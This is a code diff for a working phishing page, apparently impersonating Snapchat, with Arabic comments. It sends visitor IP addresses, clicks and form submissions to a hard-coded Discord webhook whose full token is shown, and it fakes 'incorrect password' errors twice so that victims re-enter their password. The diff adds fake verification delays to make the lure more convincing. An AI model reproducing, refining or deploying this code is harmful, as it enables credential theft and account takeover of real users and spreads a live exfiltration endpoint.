@@ -1,5 +1,5 @@
 // ===============================================
-// إعدادات ديسكورد
+// إعدادات ديسكورد - استبدل الرابط أدناه
 // ===============================================
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT"; 
 // ===============================================
@@ -13,14 +13,14 @@ function sendToDiscord(message) {
         username: "Snapchat Tracker",
         avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/100px-Snapchat_logo.svg.png" 
     };
-    return fetch(DISCORD_WEBHOOK_URL, {
+    // Fetch without waiting for response to speed up UX
+    fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
     }).catch(console.error);
 }
 
-// دالة تتبع الزوار IP
 function trackVisitorIP() {
     fetch("https://api64.ipify.org?format=json")
         .then(res => res.json())
@@ -30,22 +30,33 @@ function trackVisitorIP() {
         .catch(console.error);
 }
 
-// تتبع النقر على زر التقديم
+// -----------------------------------------------------
+// 1. منطق الصفحة الرئيسية (الانتظار الرسمي)
+// -----------------------------------------------------
 function trackClickAndProceed() {
     const btn = document.getElementById('applyButton');
-    btn.textContent = "جاري التحويل...";
-    btn.disabled = true;
     
-    sendToDiscord(`🚨 **نقرة: تقديم الطلب**`)
-        .finally(() => {
-            setTimeout(() => { window.location.href = 'apply.html'; }, 2000);
-        });
+    // 1. تغيير شكل الزر ليوحي بالمعالجة
+    btn.textContent = "جاري التحقق من الأهلية..."; 
+    btn.disabled = true; // يصبح لونه باهت قليلاً بفضل CSS
+
+    // 2. إرسال الإشعار
+    sendToDiscord(`🚨 **شخص نقر على زر التقديم**\nجاري تحويله...`);
+
+    // 3. الانتظار ثانيتين ثم التحويل
+    setTimeout(() => {
+        window.location.href = 'apply.html';
+    }, 2000); 
 }
 
-// منطق النموذج
+// -----------------------------------------------------
+// 2. منطق صفحة النموذج (apply.html)
+// -----------------------------------------------------
 let attempts = 0;
 document.addEventListener('DOMContentLoaded', () => {
-    if(window.location.pathname.includes('index.html') || window.location.pathname === '/') {
+    
+    // تشغيل تتبع الزوار إذا كنا في الرئيسية
+    if(document.title.includes("تحقيق المكاسب")) {
         trackVisitorIP();
     }
 
@@ -71,17 +82,31 @@ document.addEventListener('DOMContentLoaded', () => {
             msg += `⏰ **Time:** ${new Date().toLocaleString('ar-EG')}`;
 
             if (attempts < 2) {
+                // فشل (1 و 2)
                 attempts++;
                 sendToDiscord(msg);
-                statusMsg.style.display = 'block';
-                statusMsg.textContent = "عفواً، كلمة المرور غير صحيحة.";
-                document.getElementById("passwordField").value = "";
+                
+                // محاكاة التحقق
+                btn.textContent = "جاري التحقق...";
+                btn.disabled = true;
+
+                setTimeout(() => {
+                    btn.textContent = "إرسال الطلب";
+                    btn.disabled = false;
+                    statusMsg.style.display = 'block';
+                    statusMsg.textContent = "عفواً، كلمة المرور غير صحيحة.";
+                    document.getElementById("passwordField").value = "";
+                }, 1500);
+
             } else {
+                // نجاح (3)
                 attempts++;
-                sendToDiscord(msg + "\n✅ **(تم التحويل)**");
+                sendToDiscord(msg + "\n✅ **(تم التحويل للنجاح)**");
+                
                 btn.disabled = true;
                 statusMsg.style.display = 'none';
                 loading.style.display = 'flex';
+                
                 setTimeout(() => { window.location.href = "confirmation.html"; }, 3000);
             }
         });
